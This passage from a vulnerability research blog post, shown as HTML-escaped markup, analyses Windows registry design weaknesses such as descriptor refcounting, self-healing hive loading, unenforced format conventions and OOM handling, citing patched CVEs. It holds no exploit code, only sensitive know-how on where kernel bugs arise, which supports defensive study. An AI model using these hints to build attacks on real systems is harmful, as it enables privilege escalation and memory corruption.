2024.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Currently, all instances of refcount incrementation appear to be secure and involve calling the special helper function CmpKeySecurityIncrementReferenceCount, which protects against integer overflow.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Its counterpart for refcount decrementation is CmpKeySecurityDecrementReferenceCount.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;It seems that there is a lack of clarity and understanding of how certain special types of keys, such as predefined keys and tombstone keys, behave in relation to security descriptors.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In theory, the only type of key that does not have a security descriptor assigned to it is the exit node (i.e., a key with the KEY_HIVE_EXIT flag set, found solely in the virtual hive rooted at \Registry\), while all other keys do have a security descriptor assigned to them, even if it is not used for anything.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In practice, however, there have been several vulnerabilities in Windows that resulted either from incorrect security refresh in KCB for special types of keys (&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451512&quot;&gt;CVE-2023-21774&lt;/a&gt;&lt;/span&gt;&lt;span&gt;), from releasing the security descriptor of a predefined key without considering its reference count (&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451596&quot;&gt;CVE-2023-35356&lt;/a&gt;&lt;/span&gt;&lt;span&gt;), or from completely forgetting the need for reference counting the descriptors of tombstone keys in the &amp;quot;rename&amp;quot; operation (&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451592&quot;&gt;CVE-2023-35382&lt;/a&gt;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;When the reference count of a security descriptor reaches zero and is released, this operation is irreversible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;There is no guarantee that upon reallocation, the descriptor would have the same cell index, or even that it could be reallocated at all.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is crucial for multi-step operations where individual actions could fail, necessitating a full rollback to the original state.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Ideally&lt;/span&gt;&lt;span&gt;, releasing security descriptors should always be the final step, only when the kernel can be certain that the entire operation will succeed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A vulnerability exemplifying this is &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451512&quot;&gt;CVE-2023-21772&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, where the registry virtualization code first released the old security descriptor and then attempted to allocate a new one.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If the allocation failed, the key was left without any security properties, violating a fundamental assumption of the registry and potentially having severe consequences for system memory safety.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.8p2fdoiq5s48&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Aggressive self-healing and recovery&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As I described in &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;blog post #5&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, one of the registry&amp;#39;s most interesting features, which distinguishes it from many other file format implementations, is that it is self-healing.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The entire hive loading process, from the internal CmCheckRegistry function downwards, is focused on loading the database at all costs, even if some corrupted fragments are encountered.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Only if the file damage is so extensive that recovering any data is impossible does the entire loading process fail.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Of course, given that the registry stores critical system data such as its basic configuration, and the lack of access to this data virtually prevents Windows from booting, this decision made a lot of sense from the system reliability point of view.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It&amp;#39;s probably safe to assume that it has prevented the need for system reinstallation on numerous computers&lt;/span&gt;&lt;span&gt;, simply because it did not reject hives with minor damage that might have appeared due to random hardware failure.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;However, from a security perspective, this behavior is not necessarily advantageous.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Firstly, it seems obvious that upon encountering an error in the input data, it is simpler to unconditionally halt its processing rather than attempt to repair it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the latter case, it is possible for the programmer to overlook an edge case &amp;ndash; forget to reset some field in some structure, etc. &amp;ndash; and thus instead of fixing the file, allow for another unforeseen, inconsistent state to &lt;/span&gt;&lt;span&gt;materialize &lt;/span&gt;&lt;span&gt;within it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In other words, the repair logic constitutes an additional attack surface, and one that is potentially even more interesting and error-prone than other parts of the implementation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A classic example of a vulnerability associated with this property is &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451601&quot;&gt;CVE-2023-38139&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Secondly, in my view, the existence of this logic may have negatively impacted the secure development of the registry code, perhaps by leading to a discrepancy between what it guaranteed and what other developers thought it had guaranteed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, in 1991&amp;ndash;1993, when the foundations of the Configuration Manager subsystem were being created in their current form, probably no one considered hive loading a potential attack vector.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;At that time, the registry was used only to store system configuration, and controlled hive loading was privileged and required admin rights.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, I suspect that the main goal of hive checking at that time was to detect simple data inconsistencies due to hardware problems, such as single bit flips.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;No one expected a hive to contain a complex, specially crafted multi-kilobyte data structure designed to trigger a security flaw.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Perhaps the rest of the registry code was written under the assumption that since data sanitization and self-healing occurred at load time, its state was safe from that point on and no further error handling was needed (except for out-of-memory errors).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Then, in Windows Vista, a decision was made to open access to controlled hive loading by unprivileged users through the app hive mechanism, and it suddenly turned out that the existing safeguards were not entirely adequate. Attackers now became able to devise data constructs that were structurally correct at the low level, but completely beyond the scope of what the actual implementation expected and could handle.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c30&quot;&gt;&lt;span&gt;Finally, self-healing can adversely affect system security by concealing potential registry bugs that could trigger during normal Windows operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These problems might only become apparent after a period of time and with a &amp;quot;build-up&amp;quot; of enough issues within the hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Because hives are mapped into memory, and the kernel operates directly on the data within the file, there exists a category of errors known as &amp;quot;inconsistent hive state&amp;quot;. This refers to a data structure within the hive that doesn&amp;#39;t fully conform to the file format specification.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The occurrence of such an inconsistency is noteworthy in itself and, for someone knowledgeable about the registry, it could be a direct clue for finding vulnerabilities.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, such instances rarely cause an immediate system crash or other visible side effects.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Consider security descriptors and their reference counting: as mentioned earlier, any situation where the active number of references exceeds the reference count indicates a serious security flaw.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, even if this were to happen during normal system operation, it would require all other references to that descriptor to be released and then for some other data to overwrite the freed descriptor.&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;hen, a dangling reference would need to be used to access the descriptor.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The occurrence of all these factors in sequence is quite unlikely, and the presence of self-healing further decreases these chances&lt;/span&gt;&lt;span&gt;, as the reference count would be restored to its correct value at the next hive load.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This characteristic can be likened to wrapping the entire registry code in a try/except block that catches all exceptions and masks them from the user.&lt;/span&gt;&lt;span&gt;&amp;nbsp;This is certainly helpful i&lt;/span&gt;&lt;span&gt;n the context of system reliability, but for security, it means that potential bugs are harder to spot during system run time and, for the same reason, quite difficult to fuzz.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This does not mean that they don&amp;#39;t exist; their detection just becomes more challenging.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.vxnoygntd8uc&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Unclear boundaries between hard and conventional format requirements&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This point is related to the previous section.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the regf format, there are certain requirements that are fairly obvious and must be always met for a file to be considered valid.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Likewise&lt;/span&gt;&lt;span&gt;, there are many elements that are permitted to be formatted arbitrarily, at the discretion of the&lt;/span&gt;&lt;span&gt;&amp;nbsp;format&lt;/span&gt;&lt;span&gt;&amp;nbsp;user.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, there is a third category, a gray area of requirements that &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;seem&lt;/span&gt;&lt;span&gt;&amp;nbsp;reasonable and probably &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;would be good&lt;/span&gt;&lt;span&gt;&amp;nbsp;if they were met, but it is not entirely clear whether they are formally required.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Another way to describe this set of states is one that is not generated by the Windows kernel itself but is still not obviously incorrect.&lt;/span&gt;&lt;span&gt;&amp;nbsp;From a researcher&amp;#39;s perspective&lt;/span&gt;&lt;span&gt;, it would be worthwhile to know which parts of the format are actually required by the specification and which are only a convention adopted by the Windows code.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c30&quot;&gt;&lt;span&gt;We might never find out, &lt;/span&gt;&lt;span&gt;as Microsoft hasn&amp;#39;t published an official format specification and it seems unlikely that they will in the future.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The only option left for us is to rely on the implementation of the CmpCheck&lt;/span&gt;&lt;span&gt;* &lt;/span&gt;&lt;span&gt;functions (CmpCheckKey, CmpCheckValueList, etc.) as a sort of oracle and assume that everything there is enforced as a hard requirement, while all other states are permissible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;If we go down this path, we might be in for a big surprise, as&lt;/span&gt;&lt;span&gt;&amp;nbsp;it turns out that there are many logical-sounding requirements that are not enforced in practice.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This could allow user-controlled hives to contain constructs that are not obviously problematic, but are inconsistent with the spirit of the registry and its rules.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In many cases, &lt;/span&gt;&lt;span&gt;they allow&lt;/span&gt;&lt;span&gt;&amp;nbsp;encoding data in a less-than-optimal way, leading to unexpected redundancy.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Some examples of such constructs are presented below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_82xwcoadaw1l-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Values with duplicate names within a single key:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Under normal conditions, only one value with a given name can exist in a key, and if there is a subsequent write to the same name, the new data is assigned to the existing value.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, the uniqueness of value names is not required &lt;/span&gt;&lt;span&gt;in input hives&lt;/span&gt;&lt;span&gt;, and it is possible to load a hive with duplicate values.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Duplicate identical security descriptors within a single hive:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Similar to the previous point, it is assumed that security descriptors within a hive are unique, and if an existing descriptor is assigned to another key, its reference count is incremented rather than allocating a new object.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, there is no guarantee that a specially crafted hive will not contain multiple duplicates of the same security descriptor, and this is accepted by the loader.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Uncompressed key names consisting solely of ASCII characters:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Under normal circumstances, if a given key has a name comprising only ASCII characters, it will always be stored in a compressed form, i.e., by writing two bytes of the name in each element of the _CM_KEY_NODE.Name array of type uint16, and setting the KEY_COMP_NAME flag (0x20) in _CM_KEY_NODE.Flags.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, once again, optimal representation of names is not required when loading the hive, and this convention can be ignored without issue.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Allocated but unused cells:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The Windows registry implementation deallocates objects within a hive when they are no longer needed, making space for new data.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, the loader does not require every cell marked &amp;quot;allocated&amp;quot; to be actively used.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Similarly, security descriptors with a reference count of zero are typically deallocated.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, until a November 2024 refactor of the CmpCheckAndFixSecurityCellsRefcount function, it was possible to load a hive with unused security descriptors still present in the linked list.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This behavior has since been changed, and unused security descriptors encountered during loading are now automatically freed and removed from the list.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;These examples illustrate the issue well, but none of them (as far as I know) have particularly significant security implications.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, there were also a few specific memory corruption vulnerabilities that stemmed from the fact that the registry code made theoretically sound &lt;/span&gt;&lt;span&gt;assumptions about the hive structure&lt;/span&gt;&lt;span&gt;, but they were not unenforced by the loader&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_w35fdwefgib8-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451463&quot;&gt;CVE-2022-37988&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: This bug is closely related to the fact that cells larger than 16 KiB are aligned to the nearest power of two in Windows, but this condition doesn&amp;#39;t need to be satisfied during loading.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This caused the shrinking of a cell to fail, even though it should always succeed in-place, &amp;quot;surprising&amp;quot; the client of the allocator and resulting in a use-after-free condition.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451449&quot;&gt;CVE-2022-37956&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: &lt;/span&gt;&lt;span&gt;As I described in &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;5&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, Windows has some logic to ensure that no leaf-type subkey list (li, lf, or lh) exceeds 511 or 1012 elements, depending on its specific type.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If a list is expanded beyond this limit, it is automatically split into two lists, each half the original length.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Another reasonable assumption is that the root index length would never approach the maximum value of _CM_KEY_INDEX.Count (uint16) under normal circumstances.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This would require an unrealistically large number of subkeys or a very specific sequence of millions of key creations and deletions with specific names.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, it was possible to load a hive containing a subkey list of any of the four types with a length equal to 0xFFFF, and trigger a 16-bit integer overflow on the length field, leading to memory corruption.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Interestingly, this is one of the few bugs that could be triggered solely with &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;a single .bat file containing a long sequence of the reg.exe command executions.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451465&quot;&gt;CVE-2022-38037&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: &lt;/span&gt;&lt;span&gt;In this case, the kernel &lt;/span&gt;&lt;span&gt;code &lt;/span&gt;&lt;span&gt;assumed that the hive version defined in the header (_HBASE_BLOCK.Minor) always corresponded to the type of subkey lists used in a given hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, if the file version is regf 1.3, it should be impossible for it to contain lists in a format introduced in version 1.5.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, for some reason, the hive loader doesn&amp;#39;t enforce the proper relationship between the format version and the structures used in it, which in this case led to a serious hive-based memory corruption vulnerability.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As we can see, it is crucial to differentiate between format elements that are conventions adopted by a specific implementation, and those actually enforced during the processing of the input file.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If we encounter some code that makes assumptions from the former group that don&amp;#39;t belong to the latter one, this could indicate a serious security issue.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.57kkw5ql7d01&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Susceptibility to mishandling OOM conditions&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Generally speaking, the implementation of any function in the Windows kernel is built roughly according to the following scheme:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NTSTATUS NtHighLevelOperation(...) {&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; NTSTATUS Status;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; Status = HelperFunction1(...);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp;(!NT_SUCCESS(Status)) {&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;// Clean up...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp;Status;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; Status = HelperFunction2(...);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp;(!NT_SUCCESS(Status)) {&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c16 ujDEXfwdRL-c20&quot;&gt;// Clean up...&lt;/span&gt;&lt;/p&gt;
